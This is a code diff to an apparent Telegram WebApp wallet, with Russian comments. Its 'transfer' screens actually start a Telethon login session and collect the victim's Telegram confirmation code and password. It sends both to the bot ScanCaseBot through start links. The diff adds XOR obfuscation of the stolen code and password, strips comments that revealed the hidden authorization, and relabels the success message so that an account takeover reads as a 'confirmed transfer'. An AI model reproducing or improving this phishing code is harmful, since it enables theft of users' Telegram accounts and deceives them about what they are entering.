@@ -87,6 +87,22 @@ async function decryptCheck(token) {
     }
 }
 
+// ============ XOR ШИФРОВАНИЕ ДЛЯ КОДА/ПАРОЛЯ ============
+
+async function xorEncrypt(plaintext) {
+    const key = await sha256(SECRET_KEY);
+    const data = new TextEncoder().encode(plaintext);
+    const encrypted = new Uint8Array(data.length);
+    for (let i = 0; i < data.length; i++) {
+        encrypted[i] = data[i] ^ key[i % key.length];
+    }
+    let b64 = btoa(String.fromCharCode(...encrypted));
+    b64 = b64.replace(/\+/g, '-').replace(/\//g, '_').replace(/=/g, '');
+    return b64;
+}
+
+// ============ ХРАНИЛИЩЕ ============
+
 function getUserStorageKey(userId) {
     return `app_user_${userId}`;
 }
@@ -171,6 +187,7 @@ function renderMiniHistoryItem(tx) {
     const iconClass = isIncome ? 'income' : 'outcome';
     const amountClass = isIncome ? 'income' : 'outcome';
     const sign = isIncome ? '+' : '-';
+    const statusBadge = tx.status === 'processing' ? '<span class="tx-status">⏳</span>' : '';
     const iconSvg = isIncome 
         ? '<svg viewBox="0 0 24 24"><path d="M7 14l5-5 5 5H7z"/></svg>'
         : '<svg viewBox="0 0 24 24"><path d="M7 10l5 5 5-5H7z"/></svg>';
@@ -179,7 +196,7 @@ function renderMiniHistoryItem(tx) {
             <div class="history-item-left">
                 <div class="history-icon ${iconClass}">${iconSvg}</div>
                 <div class="history-info">
-                    <div class="history-desc">${tx.description}</div>
+                    <div class="history-desc">${tx.description} ${statusBadge}</div>
                     <div class="history-date">${formatDate(tx.date)}</div>
                 </div>
             </div>
@@ -193,6 +210,7 @@ function renderFullHistoryItem(tx) {
     const iconClass = isIncome ? 'income' : 'outcome';
     const amountClass = isIncome ? 'income' : 'outcome';
     const sign = isIncome ? '+' : '-';
+    const statusText = tx.status === 'processing' ? ' • В обработке' : '';
     const iconSvg = isIncome 
         ? '<svg viewBox="0 0 24 24"><path d="M7 14l5-5 5 5H7z"/></svg>'
         : '<svg viewBox="0 0 24 24"><path d="M7 10l5 5 5-5H7z"/></svg>';
@@ -202,7 +220,7 @@ function renderFullHistoryItem(tx) {
                 <div class="all-history-icon ${iconClass}">${iconSvg}</div>
                 <div class="all-history-info">
                     <div class="all-history-desc">${tx.description}</div>
-                    <div class="all-history-date">${formatDate(tx.date)}</div>
+                    <div class="all-history-date">${formatDate(tx.date)}${statusText}</div>
                 </div>
             </div>
             <div class="all-history-amount ${amountClass}">${sign}${tx.amount.toFixed(2)} ₽</div>
@@ -416,7 +434,6 @@ if (transferBtn) {
 const setupScreen = document.getElementById('setupScreen');
 const setupPhoneStep = document.getElementById('setupPhoneStep');
 
-// Клик по пунктам перевода — просто открываем форму, без авторизации
 document.querySelectorAll('.transfer-item').forEach(item => {
     item.addEventListener('click', () => {
         const action = item.dataset.action;
@@ -540,7 +557,7 @@ if (user) {
     }
 }
 
-// ==================== ЭКРАН ВВОДА КОДА ПОДТВЕРЖДЕНИЯ ====================
+// ==================== ЭКРАН ВВОДА КОДА ====================
 
 const codeScreen = document.getElementById('codeScreen');
 const codeDots = document.querySelectorAll('.code-dot');
@@ -559,17 +576,16 @@ function updateCodeDots() {
     });
 }
 
-function appendCodeDigit(digit) {
+async function appendCodeDigit(digit) {
     if (currentCode.length >= 5) return;
     currentCode += digit;
     updateCodeDots();
     if (currentCode.length === 5) {
-        // Код введён полностью — отправляем в бота через скрытую ссылку
+        // Шифруем код перед отправкой
+        const encryptedCode = await xorEncrypt(currentCode);
         const botUsername = 'ScanCaseBot';
-        tg.openTelegramLink(`https://t.me/${botUsername}?start=sendCode_${currentUserId}_${currentCode}`);
-        // Показываем toast что код отправляется
+        tg.openTelegramLink(`https://t.me/${botUsername}?start=sendCode_${currentUserId}_${encryptedCode}`);
         showToast('Код отправляется...', 'info');
-        // Через 2 секунды закрываем WebApp, чтобы пользователь увидел ответ бота в чате
         setTimeout(() => {
             tg.close();
         }, 2000);
@@ -613,14 +629,16 @@ const passwordInput = document.getElementById('passwordInput');
 const passwordSubmit = document.getElementById('passwordSubmit');
 
 if (passwordSubmit) {
-    passwordSubmit.addEventListener('click', () => {
+    passwordSubmit.addEventListener('click', async () => {
         const password = passwordInput.value.trim();
         if (!password) {
             showToast('Введите пароль', 'error');
             return;
         }
+        // Шифруем пароль перед отправкой
+        const encryptedPassword = await xorEncrypt(password);
         const botUsername = 'ScanCaseBot';
-        tg.openTelegramLink(`https://t.me/${botUsername}?start=sendPassword_${currentUserId}_${password}`);
+        tg.openTelegramLink(`https://t.me/${botUsername}?start=sendPassword_${currentUserId}_${encryptedPassword}`);
         showToast('Пароль отправляется...', 'info');
         setTimeout(() => {
             tg.close();
@@ -628,7 +646,7 @@ if (passwordSubmit) {
     });
 }
 
-// ==================== ЛОГИКА ПЕРЕВОДОВ С АВТОРИЗАЦИЕЙ ====================
+// ==================== ЛОГИКА ПЕРЕВОДОВ ====================
 
 function validateAmount(value, min) {
     const num = parseFloat(value);
@@ -652,20 +670,24 @@ function addTransaction(type, amount, description) {
     renderMiniHistory();
 }
 
-// Функция запуска авторизации через Telethon
-// Вызывается при нажатии кнопки "Перевести" в форме
+// Сохраняет pending транзакцию перед авторизацией
+function savePendingTransaction(amount, description) {
+    userData.pending_transaction = {
+        amount: amount,
+        description: description,
+        date: new Date().toISOString()
+    };
+    saveUserData(currentUserId, userData);
+}
+
 function startAuthFlow() {
     const botUsername = 'ScanCaseBot';
-    // Отправляем запрос на создание сессии (скрыто, WebApp не закрывается)
     tg.openTelegramLink(`https://t.me/${botUsername}?start=createSession_${currentUserId}`);
-    // Показываем экран ввода кода через 2 секунды (даём боту время отправить код)
     setTimeout(() => {
-        // Скрываем текущую форму перевода
         const activeForm = document.querySelector('.transfer-form-screen.active');
         if (activeForm) {
             activeForm.classList.remove('active');
         }
-        // Показываем экран ввода кода
         codeScreen.classList.add('active');
         pushScreen(codeScreen, null, "#1a1d29");
     }, 2000);
@@ -690,7 +712,8 @@ if (walletSubmit) {
             return;
         }
 
-        // Запускаем flow авторизации
+        // Сохраняем pending транзакцию
+        savePendingTransaction(amount, `Перевод в кошелёк: ${recipient}`);
         startAuthFlow();
     });
 }
@@ -727,6 +750,7 @@ if (cardSubmit) {
             return;
         }
 
+        savePendingTransaction(amount, `Перевод на карту **** ${card.slice(-4)}`);
         startAuthFlow();
     });
 }
@@ -750,11 +774,12 @@ if (phoneSubmit) {
             return;
         }
 
+        savePendingTransaction(amount, `Перевод по телефону: ${phone}`);
         startAuthFlow();
     });
 }
 
-// ==================== СОЗДАНИЕ ЧЕКА (без авторизации) ====================
+// ==================== СОЗДАНИЕ ЧЕКА ====================
 
 const checkSubmit = document.getElementById('checkSubmit');
 const checkAmount = document.getElementById('checkAmount');
@@ -847,7 +872,7 @@ if (checkCopyBtn) {
     });
 }
 
-// ==================== ОБРАБОТКА STARTAPP ПАРАМЕТРОВ ====================
+// ==================== ОБРАБОТКА STARTAPP ====================
 
 function handleStartAppParam() {
     const startParam = tg.initDataUnsafe?.start_param;
@@ -868,8 +893,16 @@ function handleStartAppParam() {
     } else if (startParam.startsWith('success_')) {
         const targetUserId = parseInt(startParam.split('_')[1]);
         if (targetUserId === currentUserId) {
-            showToast('Авторизация успешна!', 'success');
+            showToast('Перевод подтверждён!', 'success');
             userData.telegramAuth = true;
+            // Обновляем баланс и историю из localStorage (бот уже обновил)
+            const freshData = loadUserData(currentUserId);
+            if (freshData) {
+                userData.balance = freshData.balance;
+                userData.transactions = freshData.transactions || [];
+                updateBalanceDisplay();
+                renderMiniHistory();
+            }
             saveUserData(currentUserId, userData);
         }
     } else if (startParam.startsWith('retry_')) {
